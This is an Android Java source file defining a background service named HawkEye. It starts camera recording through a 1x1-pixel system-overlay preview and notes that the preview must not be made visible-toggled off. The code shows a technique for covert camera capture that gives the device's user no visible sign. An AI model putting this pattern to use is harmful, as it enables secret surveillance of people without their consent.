package com.hwq.videocamera;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.IBinder;
import android.view.SurfaceHolder;
import android.view.SurfaceHolder.Callback;
import android.view.SurfaceView;
import android.view.WindowManager;

public class HawkEye extends Service {
    public void onCreate() {
        super.onCreate();
        takePhoto(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public IBinder onBind(Intent arg0) {
        return null;
    }

    private static void takePhoto(final Context context) {
        final SurfaceView preview = new SurfaceView(context);
        SurfaceHolder holder = preview.getHolder();
        // deprecated setting, but required on Android versions prior to 3.0
        holder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);

        holder.addCallback(new Callback() {
            @Override
            // The preview must happen at or after this point or takePicture
            // fails
            public void surfaceCreated(SurfaceHolder holder) {
                RecordThread thread = new RecordThread(20000, preview, holder);
                thread.start();
            }

            @Override
            public void surfaceDestroyed(SurfaceHolder holder) {
            }

            @Override
            public void surfaceChanged(SurfaceHolder holder, int format,
                    int width, int height) {
            }
        });

        WindowManager wm = (WindowManager) context
                .getSystemService(Context.WINDOW_SERVICE);
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(1,
                1, // Must be at least 1x1
                WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY, 0,
                // Don't know if this is a safe default
                PixelFormat.UNKNOWN);

        // Don't set the preview visibility to GONE or INVISIBLE
        wm.addView(preview, params);
    }
}
